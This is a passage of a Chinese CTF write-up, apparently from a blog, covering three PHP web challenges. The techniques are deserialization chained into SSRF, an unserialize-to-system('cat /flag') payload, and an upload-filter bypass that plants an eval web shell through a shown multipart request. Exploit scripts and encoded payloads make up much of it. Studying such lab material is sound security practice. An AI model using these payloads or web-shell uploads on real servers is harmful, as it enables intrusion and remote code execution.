            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">local</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://127.0.0.1/"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Backdoor</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$superhacker</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hacker.jpg"</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">goodman</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$i</span><span class="token operator">-&gt;</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">superhacker</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">goodman</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">-&gt;</span><span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image_path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//flag in /flag.php</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http:|gopher:|glob:|php:/i"</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="data:jpg;base64,'</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"/&gt;'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src="data:jpg;base64,'</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cheems.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"/&gt;'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path_info'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$path_info</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path_info'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$FV</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$path_info</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$FV</span><span class="token operator">-&gt;</span><span class="token function">loadfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"vergil.jpg"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h2&gt;POWER!!&lt;/h2&gt;
            &lt;img src="data:jpg;base64,'</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"/&gt;'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <p>
     其实还有 file 伪协议未被过滤
    </p>
    <p>
     反序列化+SSRF，启动！
    </p>
    <p>
     注意程序在 unserialize 之后会调用 $FV-&gt;loadfile();, 如果 $FV 不是 FileViewer 类的实例则会抛出异常, 导致 Backdoor 类的 __destruct 不会成功执行
    </p>
    <p>
     解决方法就是再实例化一个 FileViewer 对象 将 Backdoor 塞进这个对象的某个属性里 (php 可以反序列化出不存在的属性)
    </p>
    <p>
     简单讲就是 class1(class2) 进行反序列化时，会先从 class2 开始反序列化
    </p>
    <pre><code>FileViewer -&gt; Backdoor::__destruct() -&gt; FileViewer::__call() -&gt; FileViewer::loadfile() -&gt; FileViewer::curl()
</code></pre>
    <p>
     //flag in /flag.php
    </p>
    <p>
     exp
    </p>
    <pre><code>&lt;?php
class FileViewer{
    public $black_list = "sb";
    public $local;
    public $path='flag.php';
}
class Backdoor{
    public $a;
    public $b='local';
    public $superhacker = "127.0.0.1:65500/";
}

$fileviewer = new FileViewer();
$backdoor = new Backdoor();

$backdoor -&gt; a = $fileviewer;
$sm = new FileViewer();   #避免报错
$sm -&gt; local = $backdoor;

echo serialize($sm);      #塞了一个，Backdoor类，在内部进行反序列化触发文件curl
echo PHP_EOL;
//echo base64_encode('O:10:"FileViewer":3:{s:10:"black_list";s:2:"sb";s:5:"local";O:8:"Backdoor":3:{s:1:"a";O:10:"FileViewer":6:{s:10:"black_list";s:2:"sb";s:5:"local";N;s:4:"path";s:8:"flag.php";}s:1:"b";s:5:"local";s:11:"superhacker";s:16:"127.0.0.1:65500/";}s:4:"path";s:8:"flag.php";}');
echo base64_encode(serialize($sm));
</code></pre>
    <pre><code>?path_info=TzoxMDoiRmlsZVZpZXdlciI6Mzp7czoxMDoiYmxhY2tfbGlzdCI7czoyOiJzYiI7czo1OiJsb2NhbCI7Tzo4OiJCYWNrZG9vciI6Mzp7czoxOiJhIjtPOjEwOiJGaWxlVmlld2VyIjozOntzOjEwOiJibGFja19saXN0IjtzOjI6InNiIjtzOjU6ImxvY2FsIjtOO3M6NDoicGF0aCI7czo4OiJmbGFnLnBocCI7fXM6MToiYiI7czo1OiJsb2NhbCI7czoxMToic3VwZXJoYWNrZXIiO3M6MTY6IjEyNy4wLjAuMTo2NTUwMC8iO31zOjQ6InBhdGgiO3M6ODoiZmxhZy5waHAiO30=?ptah_info=TzoxMDoiRmlsZVZpZXdlciI6Mzp7czo1OiJsb2NhbCI7czowOiIiO3M6NDoicGF0aCI7TjtzOjQ6InRleHQiO086ODoiQmFja2Rvb3IiOjM6e3M6MToiYSI7TzoxMDoiRmlsZVZpZXdlciI6Njp7czo1OiJsb2NhbCI7czoyMjoiaHR0cDovLzEyNy4wLjAuMTo2NTUwMCI7czo0OiJwYXRoIjtzOjg6ImZsYWcucGhwIjt9czoxOiJiIjtOO3M6MTE6InN1cGVyaGFja2VyIjtzOjEwOiJoYWNrZXIuanBnIjt9fQ
</code></pre>
    <p>
     我本来也是直接让Backdoor直接包含FileViewer，但是不可以。为什么呢。
    </p>
    <pre><code>$FV = unserialize(base64_decode($path_info));
$FV-&gt;loadfile();
</code></pre>
    <p>
     当我们的反序列化正在执行的时候，会同时执行
     <span class="katex--inline">
      <span class="katex">
       <span class="katex-mathml">
        F 
        
       
         V 
        
       
         − 
        
       
         &gt; 
        
       
         l 
        
       
         o 
        
       
         a 
        
       
         d 
        
       
         f 
        
       
         i 
        
       
         l 
        
       
         e 
        
       
         ( 
        
       
         ) 
        
       
         ; 
        
       
         这个语句，但是 
        
       
      
        FV-&gt;loadfile();这个语句，但是
       </span>
       <span class="katex-html">
        <span class="base">
         <span class="strut" style="height: 0.7667em; vertical-align: -0.0833em;">
         </span>
         <span class="mord mathnormal" style="margin-right: 0.1389em;">
          F
         </span>
         <span class="mord mathnormal" style="margin-right: 0.2222em;">
          V
         </span>
         <span class="mord">
          −
         </span>
         <span class="mspace" style="margin-right: 0.2778em;">
         </span>
         <span class="mrel">
          &gt;
         </span>
         <span class="mspace" style="margin-right: 0.2778em;">
         </span>
        </span>
        <span class="base">
         <span class="strut" style="height: 1em; vertical-align: -0.25em;">
         </span>
         <span class="mord mathnormal" style="margin-right: 0.0197em;">
          l
         </span>
         <span class="mord mathnormal">
          o
         </span>
         <span class="mord mathnormal">
          a
         </span>
         <span class="mord mathnormal" style="margin-right: 0.1076em;">
          df
         </span>
         <span class="mord mathnormal">
          i
         </span>
         <span class="mord mathnormal" style="margin-right: 0.0197em;">
          l
         </span>
         <span class="mord mathnormal">
          e
         </span>
         <span class="mopen">
          (
         </span>
         <span class="mclose">
          )
         </span>
         <span class="mpunct">
          ;
         </span>
         <span class="mspace" style="margin-right: 0.1667em;">
         </span>
         <span class="mord cjk_fallback">
          这个语句，但是
         </span>
        </span>
       </span>
      </span>
     </span>
     FV是Backdoor的对象，根本没有这个方法，所以会报错。那么就要让$FV是FileViewer的对象。
    </p>
    <p>
     我们又知道，反序列化是从最里面开始反序列化的。比如，类1包含类2，那么他会先反序列化类2，再类1.
    </p>
    <p>
     于是我们是FileViewer包含（Backdoor包含（FileViewer））。
    </p>
    <p>
     为什么这里不需要绕过 wakeup() ?
    </p>
    <p>
     我的类结构 --》 Fileview(Backdoor(Fileview))
    </p>
    <p>
     目的是调用最内层的 Fileview 进行文件读取，当最内层的 Fileview local 被 wakeup 覆盖后，外层 Backdoor 反序列会将其覆盖回来。
    </p>
    <pre><code>内部类属性数量不一致，直接把内部类当垃圾回收，外部类。
外部类属性数量不一致，外部类直接被当成垃圾回收，而内部类正常。
</code></pre>
    <h2>
     <a id="1z_unserialize_464">
     </a>
     1z_unserialize
    </h2>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">lyh</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'NSSCTF.com'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lt</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lly</span><span class="token punctuation">;</span>
     
     <span class="token keyword">function</span>  <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lt</span><span class="token punctuation">;</span>

        <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lly</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
    
    
<span class="token punctuation">}</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 
<span class="token operator">?</span><span class="token operator">&gt;</span> 
</code></pre>
    <p>
     exp
    </p>
    <pre><code>class lyh
{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
}

$lyh = new lyh();
$lyh -&gt; lt = "eval";
$lyh -&gt; lly = "phpinfo()";
echo serialize($lyh);
</code></pre>
    <pre><code>nss=O:3:"lyh":5:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:9:"cat /flag";}
</code></pre>
    <h2>
     <a id="file_master_510">
     </a>
     file_master
    </h2>
    <p>
     查询文件功能报错
    </p>
    <p>
     <strong>
      Warning
     </strong>
     : file_get_contents(): remote host file access not supported, file://index.php in
     <strong>
      /var/www/html/index.php
     </strong>
     on line
     <strong>
      24
     </strong>
    </p>
    <p>
     <strong>
      Warning
     </strong>
     : file_get_contents(file://index.php): failed to open stream: no suitable wrapper could be found in
     <strong>
      /var/www/html/index.php
     </strong>
     on line
     <strong>
      24
     </strong>
    </p>
    <p>
     直接查询 index.php
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$whtie_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token punctuation">,</span><span class="token variable">$whtie_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$img_info</span> <span class="token operator">=</span> @<span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$img_info</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$img_info</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$img_info</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token variable">$save_path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php/i"</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload success!! upload/your_sessionid/your_filename"</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"image hight and width must less than 20"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"invalid file head"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"invalid file type!image/jpeg only!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="data:jpg;base64,'</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"welcome.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;'</span><span class="token punctuation">;</span>
</code></pre>
    <p>
     试一下直接读取 flag，失败
    </p>
    <p>
     先尝试文件上传
    </p>
    <p>
     提取出信息
    </p>
    <p>
     1.
     <a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B&amp;spm=1001.2101.3001.7020">
      文件类型
     </a>
     必须是image/jpeg
    </p>
    <p>
     2.要有文件头(测试不添加也行)
    </p>
    <p>
     3.宽高要小于20
    </p>
    <p>
     4.
     <a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84&amp;spm=1001.2101.3001.7020">
      文件路径
     </a>
     为upload/your_sessionid/your_filename
    </p>
    <p>
     5.文件内容不能含有php
    </p>
    <p>
     1,2要求略过
    </p>
    <p>
     3.要在文件中添加
    </p>
    <pre><code>#define height 1
#define width 1 
</code></pre>
    <p>
     4.sessionid在抓包时可以得到在Cookie: PHPSESSID=这里
    </p>
    <p>
     5.利用短标签
    </p>
    &lt;?= `nl /*`意思是把所有文件都打印出来,但是在这里测试不行，应该是权限不够 尝试传木马 ``` &lt;?= @eval($_POST['a']); ``` 看了一下，他是只检测了文件类型（使用白名单），但未检测文件后缀，所以直接传 .php 后缀即可 exp ``` Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1741614396,1741654878,1741864241,1741929342; HMACCOUNT=6FE6E841CEA52014; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1741950036; PHPSESSID=cv71nj28p9vi0li6ueqpdkjhs9 Connection: keep-alive ------WebKitFormBoundary1B6ANdBcBIGwkKNx Content-Disposition: form-data; name="file"; filename="shell.php" Content-Type: image/jpeg #define height 1 #define width 1 GIF89a &lt;?= @eval($_POST['a']); ------WebKitFormBoundary1B6ANdBcBIGwkKNx Content-Disposition: form-data; name="submit" ``` upload/cv71nj28p9vi0li6ueqpdkjhs9/shell.php 成功 但读取时会报一些权限错误，连接蚁剑进入终端，读取得到 flag
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f42756c657374617264656d6f6e2f:61727469636c652f64657461696c732f313436323637363737" class_="artid" style="display:none">
 </p>
</div>


